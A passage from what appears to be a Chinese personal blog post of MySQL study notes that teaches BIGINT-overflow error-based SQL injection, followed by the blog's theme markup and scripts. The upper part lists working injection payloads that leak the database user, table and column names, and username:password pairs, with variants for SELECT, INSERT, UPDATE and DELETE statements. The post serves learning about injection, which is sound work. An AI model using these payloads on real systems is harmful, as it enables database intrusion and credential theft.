+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select ~0;</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">| ~0 |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">| 18446744073709551615 |</span><br><span class="hljs-section">+----------------------+</span><br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure>
+
+<p>所以，如果我们对~0进行加减运算的话，也会导致BIGINT溢出错误。</p>
+</blockquote>
+<h4 id="提取技术"><a href="#提取技术" class="headerlink" title="提取技术"></a>提取技术</h4><blockquote>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">select</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span>;<br>ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> range <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;((not((select &#x27;</span>root@localhost<span class="hljs-string">&#x27; from dual))) - ~(0))&#x27;</span><br></code></pre></td></tr></table></figure>
+</blockquote>
+<p>我们先不使用加法，因为“+”通过网页浏览器进行解析的时候，会被转换为空白符（不过，你可以使用%2b来表示“+”）。 相反，我们可以使用减法。所以说，同一种注入攻击，可以有完全不同的变种。 最终的查询语句如下所示。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">!(<span class="hljs-selector-tag">select</span>*<span class="hljs-selector-tag">from</span>(<span class="hljs-selector-tag">select</span> user())<span class="hljs-attribute">x</span>)-~<span class="hljs-number">0</span><br>(<span class="hljs-selector-tag">select</span>(!<span class="hljs-attribute">x</span>-~<span class="hljs-number">0</span>)<span class="hljs-selector-tag">from</span>(<span class="hljs-selector-tag">select</span>(<span class="hljs-selector-tag">select</span> user())<span class="hljs-attribute">x</span>)<span class="hljs-selector-tag">a</span>)<br>(<span class="hljs-selector-tag">select</span>!<span class="hljs-attribute">x</span>-~<span class="hljs-number">0</span><span class="hljs-selector-class">.from</span>(<span class="hljs-selector-tag">select</span>(<span class="hljs-selector-tag">select</span> user())<span class="hljs-attribute">x</span>)<span class="hljs-selector-tag">a</span>)<br></code></pre></td></tr></table></figure>
+
+<h4 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h4><p>提取数据的方法，跟其他注入攻击手法中的一样，这里只做简单介绍。<br>首先，我们来获取表名：<br>!(select<em>from(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)x)-~0<br>取得列名：<br>select !(select</em>from(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1)x)-<del>0;<br>检索数据：<br>!(select*from(select concat_ws(‘:’,id, username, password) from users limit 0,1)x)-</del>0;</p>
+<h4 id="利用插入语句进行注入"><a href="#利用插入语句进行注入" class="headerlink" title="利用插入语句进行注入"></a>利用插入语句进行注入</h4><hr>
+<p>利用插入语句，我们也可以进行类似的注入攻击，具体语法为</p>
+<p><code>&#39;&#39; or (payload) or &#39;&#39;</code>。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users (id, username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;Eyre&#x27;</span>);<br>ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-type">BIGINT</span> UNSIGNED <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> range <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;((not((select &#x27;</span>root@localhost<span class="hljs-string">&#x27; from dual))) - ~(0))&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="利用更新语句进行注入"><a href="#利用更新语句进行注入" class="headerlink" title="利用更新语句进行注入"></a>利用更新语句进行注入</h4><p>update users set password&#x3D;’peter’ or !(select*form( select user() ) x)-~0 or ‘’ where id &#x3D;4;</p>
+<h4 id="利用删除语句进行注入"><a href="#利用删除语句进行注入" class="headerlink" title="利用删除语句进行注入"></a>利用删除语句进行注入</h4><p>delete from users where id&#x3D;’1’ or ! (select*from (select user () )x)-~0 or ‘’;</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/MySQL/" class="print-no-link">#MySQL</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>MySQL学习</div>
+      <div>http://example.com/2025/03/10/MySQL学习/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0yu1</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/05/PHP%E5%AD%A6%E4%B9%A0/" title="PHP学习">
+                        <span class="hidden-mobile">PHP学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"rXJiO5xPyhRQujM96YNprg27-gzGzoHsz","appKey":"Xiey4xa540tWKNx6gHaqwjtR","path":"window.location.pathname","placeholder":"说点什么吧…","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  <div id="visitor-location" style="margin: 10px 0; color: #666;"></div>
+  <!-- 添加网站运行时间 -->
+  <div class="footer-content">
+    <div>
+      <span id="timeDate">载入天数...</span>
+      <span id="times">载入时分秒...</span>
+      <script>
+      var now = new Date();
+      function createtime(){
+          var grt= new Date("01/21/2025 00:00:00");//此处修改你的建站时间或者网站上线时间
+          now.setTime(now.getTime()+250);
+          days = (now - grt ) / 1000 / 60 / 60 / 24;
+          dnum = Math.floor(days);
+          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+          hnum = Math.floor(hours);
+          if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+          }
+          minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+          mnum = Math.floor(minutes);
+          if(String(mnum).length ==1 ){
+                    mnum = "0" + mnum;
+          }
+          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+          snum = Math.round(seconds);
+          if(String(snum).length ==1 ){
+                    snum = "0" + snum;
+          }
+          document.getElementById("timeDate").innerHTML = "小破站已稳定运行🚀 &nbsp"+dnum+"&nbsp天";  //此次自定义显示内容
+          document.getElementById("times").innerHTML = hnum + "&nbsp小时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+      }  //此次自定义显示内容
+      setInterval("createtime()",250);
+      </script>
+    </div>
+  
+  //
+<!--统计访问量信息>
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  //
+  
+</div>
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/tag.js"></script>
+<script src="/js/loader.js"></script>
+<script src="/js/snow.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
